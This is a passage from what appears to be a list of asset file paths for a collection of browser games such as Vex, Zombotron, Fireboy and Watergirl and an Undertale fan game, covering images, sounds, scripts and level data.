ng","/src/superhot/img/options/UnpauseIcon.png","/src/superhot/img/singledpi/BoxIcon.png","/src/superhot/img/singledpi/RolledBoxIcon.png","/src/unfair-dyne/audio/bgm/fork1.wav","/src/unfair-dyne/audio/bgm/fork2.wav","/src/unfair-dyne/audio/bgm/mus_undyne.ogg","/src/unfair-dyne/audio/bgm/mus_undyneboss.ogg","/src/unfair-dyne/audio/bgm/mus_x_undyne.ogg","/src/unfair-dyne/js/attacks/aprilfools.js","/src/unfair-dyne/js/attacks/attacks.js","/src/unfair-dyne/js/attacks/genocide.js","/src/unfair-dyne/js/attacks/genocide2.js","/src/unfair-dyne/js/attacks/hard.js","/src/unfair-dyne/js/attacks/normal.js","/src/unfair-dyne/js/attacks/testing.js","/src/unfair-dyne/audio/se/0000299b.wav","/src/unfair-dyne/audio/se/0000299c.wav","/src/unfair-dyne/audio/se/000029a2.wav","/src/unfair-dyne/audio/se/000029aa.wav","/src/unfair-dyne/audio/se/000029ab.wav","/src/unfair-dyne/audio/se/000029c1.wav","/src/unfair-dyne/audio/se/000029c3.wav","/src/unfair-dyne/audio/se/000029dc.wav","/src/unfair-dyne/audio/se/000029ec.wav","/src/unfair-dyne/audio/se/000029fd.wav","/src/unfair-dyne/audio/se/00002a00.wav","/src/unfair-dyne/js/game/arrow.js","/src/unfair-dyne/js/game/attack.js","/src/unfair-dyne/js/game/box.js","/src/unfair-dyne/js/game/circlespear.js","/src/unfair-dyne/js/game/gamestate.js","/src/unfair-dyne/js/game/heart.js","/src/unfair-dyne/js/game/menu.js","/src/unfair-dyne/js/game/pike.js","/src/unfair-dyne/js/game/spear.js","/src/unfair-dyne/js/game/swarmspear.js","/src/unfair-dyne/js/game/undyne.js","/src/unfair-dyne/js/loader/fonts.js","/src/unfair-dyne/js/loader/graphics.js","/src/unfair-dyne/js/loader/sounds.js","/src/unfair-dyne/js/splash/splash.js","/src/uno/js/lib/createjs.min.js","/src/uno/js/lib/howler.min.js","/src/uno/js/lib/jquery-3.2.1.min.js","/src/vex3/assets/css/app.css","/src/vex3/assets/filters/BlurX.js","/src/vex3/assets/filters/BlurY.js","/src/vex3/assets/filters/ColorMatrixFilter.js","/src/vex3/assets/filters/Gray.js","/src/vex3/assets/images/act-check.png","/src/vex3/assets/images/breathe-block.png","/src/vex3/assets/images/circle-button.png","/src/vex3/assets/images/crouch-button.png","/src/vex3/assets/images/dark-overlay.png","/src/vex3/assets/images/hell_xl.png","/src/vex3/assets/images/jump-button.png","/src/vex3/assets/images/L_R-circle-button.png","/src/vex3/assets/images/parallaxBackground.png","/src/vex3/assets/images/press-down-hard.png","/src/vex3/assets/images/press-down-normal.png","/src/vex3/assets/images/press-down.png","/src/vex3/assets/images/space-button.png","/src/vex3/assets/images/vex-logo.png","/src/vex3/assets/sounds/achievement-unlocked.ogg","/src/vex3/assets/sounds/block-destroy.ogg","/src/vex3/assets/sounds/bounce1.ogg","/src/vex3/assets/sounds/button-click.ogg","/src/vex3/assets/sounds/cannon-enter.ogg","/src/vex3/assets/sounds/cannon-fire.ogg","/src/vex3/assets/sounds/connect-hang.ogg","/src/vex3/assets/sounds/connect.ogg","/src/vex3/assets/sounds/death2.ogg","/src/vex3/assets/sounds/ding.ogg","/src/vex3/assets/sounds/downgrade.ogg","/src/vex3/assets/sounds/electricity.ogg","/src/vex3/assets/sounds/fall.ogg","/src/vex3/assets/sounds/falling-block.ogg","/src/vex3/assets/sounds/footstep.ogg","/src/vex3/assets/sounds/glass-smash.ogg","/src/vex3/assets/sounds/kick-block.ogg","/src/vex3/assets/sounds/land.ogg","/src/vex3/assets/sounds/laser-fire.ogg","/src/vex3/assets/sounds/menu-song.ogg","/src/vex3/assets/sounds/pole-swing.ogg","/src/vex3/assets/sounds/pole-woosh.ogg","/src/vex3/assets/sounds/slide.ogg","/src/vex3/assets/sounds/splash1.ogg","/src/vex3/assets/sounds/star-pickup.ogg","/src/vex3/assets/sounds/vex-song-1.ogg","/src/vex3/assets/sounds/vex-song-2.ogg","/src/vex3/assets/sounds/vex-song-3.ogg","/src/vex3/assets/sounds/vex-song-4.ogg","/src/vex3/assets/sounds/wall-slide.ogg","/src/vex3/assets/sounds/zipline-full.ogg","/src/vex4/assets/atlas/atlas_gameplay.json","/src/vex4/assets/atlas/atlas_gameplay.png","/src/vex4/assets/atlas/atlas_portals.json","/src/vex4/assets/atlas/atlas_portals.png","/src/vex4/assets/atlas/atlas_transition.json","/src/vex4/assets/atlas/atlas_transition.png","/src/vex4/assets/atlas/atlas_ui_act_select.json","/src/vex4/assets/atlas/atlas_ui_act_select.png","/src/vex4/assets/atlas/atlas_ui_gameplay.json","/src/vex4/assets/atlas/atlas_ui_gameplay.png","/src/vex4/assets/atlas/atlas_ui_level_complete.json","/src/vex4/assets/atlas/atlas_ui_level_complete.png","/src/vex4/assets/atlas/atlas_ui_main_menu.json","/src/vex4/assets/atlas/atlas_ui_main_menu.png","/src/vex4/assets/atlas/atlas_ui_options.json","/src/vex4/assets/atlas/atlas_ui_options.png","/src/vex4/assets/atlas/atlas_ui_pause.json","/src/vex4/assets/atlas/atlas_ui_pause.png","/src/vex4/assets/atlas/atlas_ui_trophies.json","/src/vex4/assets/atlas/atlas_ui_trophies.png","/src/vex4/assets/atlas/checkpoint.json","/src/vex4/assets/atlas/checkpoint.png","/src/vex4/assets/balance/levelsConfig.json","/src/vex4/assets/balance/localization.json","/src/vex4/assets/balance/objectConfig.json","/src/vex4/assets/coco/transition.json","/src/vex4/assets/css/app.css","/src/vex4/assets/css/milocha.css","/src/vex4/assets/filters/BlurX.js","/src/vex4/assets/filters/BlurY.js","/src/vex4/assets/filters/ColorMatrixFilter.js","/src/vex4/assets/filters/Gray.js","/src/vex4/assets/fonts/grobred32.fnt","/src/vex4/assets/fonts/grobred32.png","/src/vex4/assets/images/breathe-block.png","/src/vex4/assets/images/btnBothPressed.png","/src/vex4/assets/images/btnLeftPressed.png","/src/vex4/assets/images/btnNonePressed.png","/src/vex4/assets/images/btnRightPressed.png","/src/vex4/assets/images/circle-button.png","/src/vex4/assets/images/cpromo-icon.png","/src/vex4/assets/images/crouch-button.png","/src/vex4/assets/images/crouchPressed.png","/src/vex4/assets/images/dark-overlay.png","/src/vex4/assets/images/jump-button.png","/src/vex4/assets/images/jumpPressed.png","/src/vex4/assets/images/L_R-circle-button.png","/src/vex4/assets/images/parallaxBackground.png","/src/vex4/assets/images/press-down.png","/src/vex4/assets/sounds/achievement-unlocked.ogg","/src/vex4/assets/sounds/block-destroy.ogg","/src/vex4/assets/sounds/bounce1.ogg","/src/vex4/assets/sounds/button-click.ogg","/src/vex4/assets/sounds/cannon-enter.ogg","/src/vex4/assets/sounds/cannon-fire.ogg","/src/vex4/assets/sounds/connect-hang.ogg","/src/vex4/assets/sounds/connect.ogg","/src/vex4/assets/sounds/death2.ogg","/src/vex4/assets/sounds/ding.ogg","/src/vex4/assets/sounds/downgrade.ogg","/src/vex4/assets/sounds/electricity.ogg","/src/vex4/assets/sounds/fall.ogg","/src/vex4/assets/sounds/falling-block.ogg","/src/vex4/assets/sounds/footstep.ogg","/src/vex4/assets/sounds/glass-smash.ogg","/src/vex4/assets/sounds/kick-block.ogg","/src/vex4/assets/sounds/land.ogg","/src/vex4/assets/sounds/laser-fire.ogg","/src/vex4/assets/sounds/menu-song.ogg","/src/vex4/assets/sounds/pole-swing.ogg","/src/vex4/assets/sounds/pole-woosh.ogg","/src/vex4/assets/sounds/slide.ogg","/src/vex4/assets/sounds/splash1.ogg","/src/vex4/assets/sounds/star-pickup.ogg","/src/vex4/assets/sounds/vex-song-1.ogg","/src/vex4/assets/sounds/vex-song-10.ogg","/src/vex4/assets/sounds/vex-song-11.ogg","/src/vex4/assets/sounds/vex-song-12.ogg","/src/vex4/assets/sounds/vex-song-13.ogg","/src/vex4/assets/sounds/vex-song-14.ogg","/src/vex4/assets/sounds/vex-song-2.ogg","/src/vex4/assets/sounds/vex-song-3.ogg","/src/vex4/assets/sounds/vex-song-4.ogg","/src/vex4/assets/sounds/vex-song-5.ogg","/src/vex4/assets/sounds/vex-song-6.ogg","/src/vex4/assets/sounds/vex-song-7.ogg","/src/vex4/assets/sounds/vex-song-8.ogg","/src/vex4/assets/sounds/vex-song-9.ogg","/src/vex4/assets/sounds/wall-slide.ogg","/src/vex4/assets/sounds/zipline-full.ogg","/src/vex4/assets/ui/ui_act_select.json","/src/vex4/assets/ui/ui_gameplay.json","/src/vex4/assets/ui/ui_level_complete.json","/src/vex4/assets/ui/ui_main_menu.json","/src/vex4/assets/ui/ui_options.json","/src/vex4/assets/ui/ui_pause.json","/src/vex4/assets/ui/ui_trophies.json","/src/vex5/assets/atlas/atlas_gameplay.json","/src/vex5/assets/atlas/atlas_gameplay.png","/src/vex5/assets/atlas/atlas_portals.json","/src/vex5/assets/atlas/atlas_portals.png","/src/vex5/assets/atlas/atlas_transition.json","/src/vex5/assets/atlas/atlas_transition.png","/src/vex5/assets/atlas/atlas_ui_act_select.json","/src/vex5/assets/atlas/atlas_ui_act_select.png","/src/vex5/assets/atlas/atlas_ui_gameplay.json","/src/vex5/assets/atlas/atlas_ui_gameplay.png","/src/vex5/assets/atlas/atlas_ui_lvl_complete.json","/src/vex5/assets/atlas/atlas_ui_lvl_complete.png","/src/vex5/assets/atlas/atlas_ui_main_menu.json","/src/vex5/assets/atlas/atlas_ui_main_menu.png","/src/vex5/assets/atlas/atlas_ui_options.json","/src/vex5/assets/atlas/atlas_ui_options.png","/src/vex5/assets/atlas/atlas_ui_pause.json","/src/vex5/assets/atlas/atlas_ui_pause.png","/src/vex5/assets/atlas/atlas_ui_trophies.json","/src/vex5/assets/atlas/atlas_ui_trophies.png","/src/vex5/assets/atlas/checkpoint.json","/src/vex5/assets/atlas/checkpoint.png","/src/vex5/assets/balance/levelsConfig.json","/src/vex5/assets/balance/localization.json","/src/vex5/assets/balance/objectConfig.json","/src/vex5/assets/coco/transition.json","/src/vex5/assets/css/app.css","/src/vex5/assets/css/milocha.css","/src/vex5/assets/filters/BlurX.js","/src/vex5/assets/filters/BlurY.js","/src/vex5/assets/filters/ColorMatrixFilter.js","/src/vex5/assets/filters/Gray.js","/src/vex5/assets/images/brand-logo.png","/src/vex5/assets/images/breathe-block.png","/src/vex5/assets/images/btnBothPressed.png","/src/vex5/assets/images/btnLeftPressed.png","/src/vex5/assets/images/btnNonePressed.png","/src/vex5/assets/images/btnRightPressed.png","/src/vex5/assets/images/circle-button.png","/src/vex5/assets/images/crouch-button.png","/src/vex5/assets/images/dark-overlay.png","/src/vex5/assets/images/hell_xl.png","/src/vex5/assets/images/jump-button.png","/src/vex5/assets/images/L_R-circle-button.png","/src/vex5/assets/images/parallaxBackground.png","/src/vex5/assets/images/press-down-hard.png","/src/vex5/assets/images/press-down-normal.png","/src/vex5/assets/images/press-down.png","/src/vex5/assets/images/space-button.png","/src/vex5/assets/images/vex-logo.png","/src/vex5/assets/sounds/achievementUnlocked.ogg","/src/vex5/assets/sounds/blockDestroy.ogg","/src/vex5/assets/sounds/bounce1.ogg","/src/vex5/assets/sounds/buttonClick.ogg","/src/vex5/assets/sounds/cannonEnter.ogg","/src/vex5/assets/sounds/cannonFire.ogg","/src/vex5/assets/sounds/connect.ogg","/src/vex5/assets/sounds/connectHang.ogg","/src/vex5/assets/sounds/death1.ogg","/src/vex5/assets/sounds/death2.ogg","/src/vex5/assets/sounds/ding.ogg","/src/vex5/assets/sounds/downgrade.ogg","/src/vex5/assets/sounds/electricity.ogg","/src/vex5/assets/sounds/fall.ogg","/src/vex5/assets/sounds/fallingBlock.ogg","/src/vex5/assets/sounds/footstep.ogg","/src/vex5/assets/sounds/glassSmash.ogg","/src/vex5/assets/sounds/kickBlock.ogg","/src/vex5/assets/sounds/land.ogg","/src/vex5/assets/sounds/laserFire.ogg","/src/vex5/assets/sounds/menuSong.ogg","/src/vex5/assets/sounds/poleSwing.ogg","/src/vex5/assets/sounds/poleWoosh.ogg","/src/vex5/assets/sounds/slide.ogg","/src/vex5/assets/sounds/splash1.ogg","/src/vex5/assets/sounds/starPickup.ogg","/src/vex5/assets/sounds/vexSong1.ogg","/src/vex5/assets/sounds/vexSong10.ogg","/src/vex5/assets/sounds/vexSong11.ogg","/src/vex5/assets/sounds/vexSong12.ogg","/src/vex5/assets/sounds/vexSong13.ogg","/src/vex5/assets/sounds/vexSong14.ogg","/src/vex5/assets/sounds/vexSong2.ogg","/src/vex5/assets/sounds/vexSong3.ogg","/src/vex5/assets/sounds/vexSong4.ogg","/src/vex5/assets/sounds/vexSong5.ogg","/src/vex5/assets/sounds/vexSong6.ogg","/src/vex5/assets/sounds/vexSong7.ogg","/src/vex5/assets/sounds/vexSong8.ogg","/src/vex5/assets/sounds/vexSong9.ogg","/src/vex5/assets/sounds/wallSlide.ogg","/src/vex5/assets/sounds/ziplineFull.ogg","/src/vex5/assets/ui/ui_act_select.json","/src/vex5/assets/ui/ui_gameplay.json","/src/vex5/assets/ui/ui_lvl_complete.json","/src/vex5/assets/ui/ui_main_menu.json","/src/vex5/assets/ui/ui_options.json","/src/vex5/assets/ui/ui_pause.json","/src/vex5/assets/ui/ui_trophies.json","/src/wordle/img/cutscene/StandardsToUphold.png","/src/wordle/img/cutscene/StopSolvingProblems.png","/src/wordle/img/cutscene/StudentTeacher.png","/src/wordle/img/cutscene/Superpowers.png","/src/wordle/img/cutscene/Teapot.png","/src/wordle/img/cutscene/TellAFriend.png","/src/wordle/img/cutscene/ThanksForPlaytesting.png","/src/wordle/img/cutscene/TheGap.png","/src/wordle/img/cutscene/TheNextBigThing.png","/src/wordle/img/cutscene/Truancy.png","/src/wordle/img/cutscene/TwoMonthWait.png","/src/wordle/img/cutscene/Wait.png","/src/wordle/img/cutscene/WormholeInSight.png","/src/wordle/img/cutscene/YouThink.png","/src/wordle/img/editor/DeleteLevelIcon.png","/src/wordle/img/editor/Drag.png","/src/wordle/img/editor/Ellipsis.png","/src/wordle/img/editor/EraseIcon.png","/src/wordle/img/editor/ScrollArrow.png","/src/wordle/img/editor/SelectedColor.png","/src/wordle/img/editor/ZoomInButton.png","/src/wordle/img/editor/ZoomOutButton.png","/src/wordle/img/instructions/SwipeReminder.png","/src/wordle/img/instructions/SwipeVisualInstructions.png","/src/wordle/img/map/Battery.png","/src/wordle/img/map/Box.png","/src/wordle/img/map/Bridge.png","/src/wordle/img/map/DerpRunner.png","/src/wordle/img/map/Infinity.png","/src/wordle/img/map/MapIcon.png","/src/wordle/img/map/MapIconFlat.png","/src/wordle/img/map/MapMask.png","/src/wordle/img/map/MovableBoxesIcon.png","/src/wordle/img/map/MovableBoxIcon.png","/src/wordle/img/map/Planet.png","/src/wordle/img/map/PlanetoidBelt0.png","/src/wordle/img/map/PlanetoidBelt1.png","/src/wordle/img/map/Snowflakes.png","/src/wordle/img/map/SpeechBubbles.png","/src/wordle/img/map/Teapot.png","/src/wordle/img/map/Wormhole.png","/src/wordle/img/menu/Achievements.png","/src/wordle/img/menu/AppStore.png","/src/wordle/img/menu/CheckMark.png","/src/wordle/img/menu/CloseWindowIcon.png","/src/wordle/img/menu/CreditsIcon.png","/src/wordle/img/menu/CutsceneIcon.png","/src/wordle/img/menu/EditIcon.png","/src/wordle/img/menu/GearIcon.png","/src/wordle/img/menu/GooglePlay.png","/src/wordle/img/menu/GooglePlayGames.png","/src/wordle/img/menu/GooglePlayLeaderboards.png","/src/wordle/img/menu/KongPlus.png","/src/wordle/img/menu/KongregateButton.png","/src/wordle/img/menu/Leaderboards.png","/src/wordle/img/menu/LittleAlchemistPromoButton.png","/src/wordle/img/menu/LittleAlchemistPromoComplete.png","/src/wordle/img/menu/LittleAlchemistSplash.png","/src/wordle/img/menu/PlayFabButton.png","/src/wordle/img/menu/PlayFabHeader.png","/src/wordle/img/menu/PlayGame.png","/src/wordle/img/menu/QualityIcon.png","/src/wordle/img/menu/Run.png","/src/wordle/img/menu/Run3.png","/src/wordle/img/menu/ScrollIndicator.png","/src/wordle/img/menu/Shop.png","/src/wordle/img/menu/StatsButton.png","/src/wordle/img/menu/TyrantIcon.png","/src/wordle/img/menu/TyrantPromoButton.png","/src/wordle/img/menu/TyrantPromoComplete.png","/src/wordle/img/options/BackLevelIcon.png","/src/wordle/img/options/ErrorIcon.png","/src/wordle/img/options/HomeIcon.png","/src/wordle/img/options/LargePauseIcon.png","/src/wordle/img/options/MusicIcon.png","/src/wordle/img/options/MusicOffIcon.png","/src/wordle/img/options/PauseIcon.png","/src/wordle/img/options/SkipLevelIcon.png","/src/wordle/img/options/SoundIcon.png","/src/wordle/img/options/SoundOffIcon.png","/src/wordle/img/options/UnpauseIcon.png","/src/wordle/img/singledpi/BoxIcon.png","/src/wordle/img/singledpi/RolledBoxIcon.png","/src/zombotron/assets/css/game.css","/src/zombotron/assets/fonts/frivFont.woff","/src/zombotron/assets/scripts/game.js","/src/zombotron-2/assets/css/game.css","/src/zombotron-2/assets/fonts/frivFont.woff","/src/zombotron-2/assets/scripts/game.js","/src/zombotron-2-time-machine/assets/css/game.css","/src/zombotron-2-time-machine/assets/fonts/frivFont.woff","/src/zombotron-2-time-machine/assets/scripts/game.js","/src/zombsroyale/asset/build/UnityLoader.js","/src/zombsroyale/asset/build/webgl.data.unityweb","/src/zombsroyale/asset/build/webgl.wasm.code.unityweb","/src/zombsroyale/asset/build/webgl.wasm.framework.unityweb","/src/zombsroyale/asset/image/background.png","/src/zombsroyale/asset/image/help-four-left.png","/src/zombsroyale/asset/image/help-four-right.png","/src/zombsroyale/asset/image/help-one-left.png","/src/zombsroyale/asset/image/help-one-right.png","/src/zombsroyale/asset/image/help-three-left.png","/src/zombsroyale/asset/image/help-three-right.png","/src/zombsroyale/asset/image/help-two-left.png","/src/zombsroyale/asset/image/help-two-right.png","/src/zombsroyale/asset/image/logo.png","/src/zombsroyale/asset/image/player-regular.png","/src/zombsroyale/asset/image/player-scar.png","/src/zombsroyale/asset/image/prop-tree.png","/src/zombsroyale/asset/image/weapon-pistol.png","/src/basketball-stars/assets/atlases/x1/ach.json","/src/basketball-stars/assets/atlases/x1/ach.png","/src/basketball-stars/assets/atlases/x1/gameplay.json","/src/basketball-stars/assets/atlases/x1/gameplay.png","/src/basketball-stars/assets/atlases/x1/interface.json","/src/basketball-stars/assets/atlases/x1/interface.png","/src/basketball-stars/assets/atlases/x1/preloader.json","/src/basketball-stars/assets/atlases/x1/preloader.png","/src/basketball-stars/assets/fonts/AllerDisplay/AllerDisplay.woff","/src/basketball-stars/assets/fonts/CfCrackBold/cfcrackandbold.woff","/src/basketball-stars/assets/fonts/Impact/impact.woff","/src/basketball-stars/assets/fonts/Impact2/impact.woff","/src/basketball-stars/assets/fonts/Impact3/impact.woff","/src/basketball-stars/assets/images/x1/data.png","/src/basketball-stars/assets/images/x1/data2.png","/src/basketball-stars/assets/images/x1/data3.png","/src/breaklock/src/controllers/countdown/countdown.ctrl.js","/src/breaklock/src/controllers/countdown/countdown.scss","/src/breaklock/src/controllers/game/game.ctrl.js","/src/breaklock/src/controllers/game/game.scss","/src/breaklock/src/controllers/extender/extender.ctrl.js","/src/breaklock/src/controllers/extender/extender.scss","/src/breaklock/src/controllers/history/history.ctrl.js","/src/breaklock/src/controllers/history/history.scss","/src/breaklock/src/controllers/lock/lock.ctrl.js","/src/breaklock/src/controllers/lock/lock.scss","/src/breaklock/src/controllers/menu/menu.ctrl.js","/src/breaklock/src/controllers/menu/menu.scss","/src/breaklock/src/controllers/option/option.ctrl.js","/src/breaklock/src/controllers/option/option.scss","/src/breaklock/src/controllers/selector/selector.ctrl.js","/src/breaklock/src/controllers/selector/selector.scss","/src/breaklock/src/controllers/statusBar/statusBar.ctrl.js","/src/breaklock/src/controllers/statusBar/statusBar.scss","/src/breaklock/src/controllers/summary/summary.ctrl.js","/src/breaklock/src/controllers/summary/summary.scss","/src/breaklock/src/controllers/summary/summaryFeedback.js","/src/donut-boy/assets-db/audio/fresh_audio/bonk_beach_loop.mp3","/src/donut-boy/assets-db/audio/fresh_audio/bread_smelter_loop.mp3","/src/donut-boy/assets-db/audio/fresh_audio/ditzy_loop.mp3","/src/donut-boy/assets-db/audio/fresh_audio/donutBoyIntro2.mp3","/src/donut-boy/assets-db/audio/fresh_audio/donut_boy_loop.mp3","/src/donut-boy/assets-db/audio/fresh_audio/essooess_loop.mp3","/src/donut-boy/assets-db/audio/fresh_audio/gil_radio_loop.mp3","/src/donut-boy/assets-db/audio/fresh_audio/goal_get.mp3","/src/donut-boy/assets-db/audio/fresh_audio/uh_oh.mp3","/src/donut-boy/assets-db/audio/fresh_audio/wicked_dwellings_loop.mp3","/src/donut-boy/assets-db/audio/fresh_audio/you_done_it_loop.mp3","/src/donut-boy/assets-db/audio/zombieHits/zombieHit1SFX.mp3","/src/donut-boy/assets-db/audio/zombieHits/zombieHit2SFX.mp3","/src/donut-boy/assets-db/audio/zombieHits/zombieHit3SFX.mp3","/src/donut-boy/assets-db/audio/zombieHits/zombieHit4SFX.mp3","/src/donut-boy/assets-db/audio/zombieHits/zombieHit5SFX.mp3","/src/donut-boy/assets-db/images/celebrate/yay_blueDark.png","/src/donut-boy/assets-db/images/celebrate/yay_blueLight.png","/src/donut-boy/assets-db/images/celebrate/yay_green.png","/src/donut-boy/assets-db/images/celebrate/yay_greenLight.png","/src/donut-boy/assets-db/images/celebrate/yay_orange.png","/src/donut-boy/assets-db/images/celebrate/yay_pink.png","/src/donut-boy/assets-db/images/celebrate/yay_purple.png","/src/donut-boy/assets-db/images/celebrate/yay_red.png","/src/donut-boy/assets-db/images/celebrate/yay_teal.png","/src/donut-boy/assets-db/images/celebrate/yay_yellow.png","/src/donut-boy/assets-db/images/crumbs/crumb1.png","/src/donut-boy/assets-db/images/crumbs/crumb2.png","/src/donut-boy/assets-db/images/crumbs/crumb3.png","/src/donut-boy/assets-db/images/crumbs/crumb4.png","/src/donut-boy/assets-db/images/crumbs/crumb5.png","/src/donut-boy/assets-db/images/crumbs/crumb6.png","/src/donut-boy/assets-db/images/goalEmit/goalEmit1.png","/src/donut-boy/assets-db/images/goalEmit/goalEmit2.png","/src/donut-boy/assets-db/images/goalEmit/goalEmit3.png","/src/donut-boy/assets-db/images/goalEmit/goalEmit4.png","/src/donut-boy/assets-db/images/goalEmit/goalEmit5.png","/src/donut-boy/assets-db/images/hotEmit/hotEmit1.png","/src/donut-boy/assets-db/images/hotEmit/hotEmit2.png","/src/donut-boy/assets-db/images/hotEmit/hotEmit3.png","/src/donut-boy/assets-db/images/invisible_plats/invisPlat100.png","/src/donut-boy/assets-db/images/invisible_plats/invisPlat125.png","/src/donut-boy/assets-db/images/invisible_plats/invisPlat150.png","/src/donut-boy/assets-db/images/invisible_plats/invisPlat175.png","/src/donut-boy/assets-db/images/invisible_plats/invisPlat25.png","/src/donut-boy/assets-db/images/invisible_plats/invisPlat50.png","/src/donut-boy/assets-db/images/invisible_plats/invisPlat75.png","/src/donut-boy/assets-db/images/toasterEmit/tEmit1.png","/src/donut-boy/assets-db/images/toasterEmit/tEmit2.png","/src/donut-boy/assets-db/images/toasterEmit/tEmit3.png","/src/donut-boy/assets-db/images/toasterEmit/tEmit4.png","/src/donut-boy/assets-db/images/toasterEmit/tEmit5.jpg","/src/donut-boy/assets-db/images/unburyEmit/unburyEmit1.png","/src/donut-boy/assets-db/images/unburyEmit/unburyEmit2.png","/src/donut-boy/assets-db/images/unburyEmit/unburyEmit3.png","/src/donut-boy/assets-db/images/unburyEmit/unburyEmit4.png","/src/donut-boy/assets-db/images/zombies/zombie1.png","/src/donut-boy/assets-db/images/zombies/zombie2.png","/src/donut-boy/assets-db/images/zombies/zombie3.png","/src/donut-boy/assets-db/images/zombies/zombie4.png","/src/donut-boy/assets-db/images/zombies/zombie5.png","/src/donut-boy/assets-db/images/zombies/zombie6.png","/src/donut-boy/assets-db/images/zombies/zombie7.png","/src/donut-boy/assets-db/images/zombies/zombie8.png","/src/donut-boy/assets-db/images/zombies/zombie9.png","/src/donut-boy/assets-db/images/zombie_emitter/zombie_emitter1.png","/src/donut-boy/assets-db/images/zombie_emitter/zombie_emitter2.png","/src/fireboy-and-watergirl-forest-temple/assets/images/branding/branding_logo_kizi.png","/src/fireboy-and-watergirl-forest-temple/assets/images/stores/android.png","/src/fireboy-and-watergirl-forest-temple/assets/images/stores/ios.png","/src/fireboy-and-watergirl-forest-temple/assets/images/stores/microsoft.png","/src/fireboy-and-watergirl-forest-temple/assets/images/stores/steam.png","/src/fireboy-and-watergirl-forest-temple/assets/tilemaps/tilesets/Chars.json","/src/fireboy-and-watergirl-forest-temple/assets/tilemaps/tilesets/Ground.json","/src/fireboy-and-watergirl-forest-temple/assets/tilemaps/tilesets/LargeObjects.json","/src/fireboy-and-watergirl-forest-temple/assets/tilemaps/tilesets/Objects.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_02.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_03.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_04.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_05.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_06.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_07.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_08.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_09.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_10.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_11.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_12.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_13.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_14.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_15.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_16.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_17.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_18.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_19.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_20.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_21.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_22.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_23.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_24.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_25.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_26.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_27.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_28.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_29.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_30.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_31.json","/src/fireboy-and-watergirl-forest-temple/data/forest/levels/forest_32.json","/src/fireboy-and-watergirl-forest-temple/data/tutorials/levels/forest_01.json","/src/flakboy/dependencies/bower_components/box2d.js/box2d.js","/src/friday-night-funkin--vs-ex/assets/data/genocide/commands.json","/src/friday-night-funkin--vs-ex/assets/data/genocide/genocide-easy.json","/src/friday-night-funkin--vs-ex/assets/data/genocide/genocide-hard.json","/src/friday-night-funkin--vs-ex/assets/data/genocide/genocide.json","/src/friday-night-funkin--vs-ex/assets/data/genocide/genocideDialogue.txt","/src/friday-night-funkin--vs-ex/assets/data/last-chance/last-chance-easy.json","/src/friday-night-funkin--vs-ex/assets/data/last-chance/last-chance-hard.json","/src/friday-night-funkin--vs-ex/assets/data/last-chance/last-chance.json","/src/friday-night-funkin--vs-ex/assets/data/last-chance/last-chanceDialogue.txt","/src/friday-night-funkin--vs-ex/assets/data/my-battle/my-battle-easy.json","/src/friday-night-funkin--vs-ex/assets/data/my-battle/my-battle-hard.json","/src/friday-night-funkin--vs-ex/assets/data/my-battle/my-battle.json","/src/friday-night-funkin--vs-ex/assets/data/my-battle/my-battleDialogue.txt","/src/friday-night-funkin--vs-ex/assets/images/menucharacter/campaign_menu_UI_characters.png","/src/friday-night-funkin--vs-ex/assets/images/menucharacter/campaign_menu_UI_characters.xml","/src/friday-night-funkin--vs-ex/assets/images/menucharacter/tabi.png","/src/friday-night-funkin--vs-ex/assets/images/menucharacter/tabi.xml","/src/friday-night-funkin--vs-ex/assets/preload/data/characterList.txt","/src/friday-night-funkin--vs-ex/assets/preload/data/controls.txt","/src/friday-night-funkin--vs-ex/assets/preload/data/data-goes-here.txt","/src/friday-night-funkin--vs-ex/assets/preload/data/freeplaySonglist.txt","/src/friday-night-funkin--vs-ex/assets/preload/data/introText.txt","/src/friday-night-funkin--vs-ex/assets/preload/data/specialThanks.txt","/src/friday-night-funkin--vs-ex/assets/preload/images/virtual-input.txt","/src/friday-night-funkin--vs-ex/assets/shared/images/images-go-here.txt","/src/friday-night-funkin--vs-ex/assets/shared/sounds/sounds-go-here.txt","/src/friday-night-funkin--vs-ex/assets/images/storymenu/week0.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/box.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/button.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/button_arrow_down.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/button_arrow_left.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/button_arrow_right.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/button_arrow_up.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/button_thin.png","/src/friday-night-funkin--vs-ex/flixel/flixel-ui/img/button_toggle.png","/src/friday-night-funkin--vs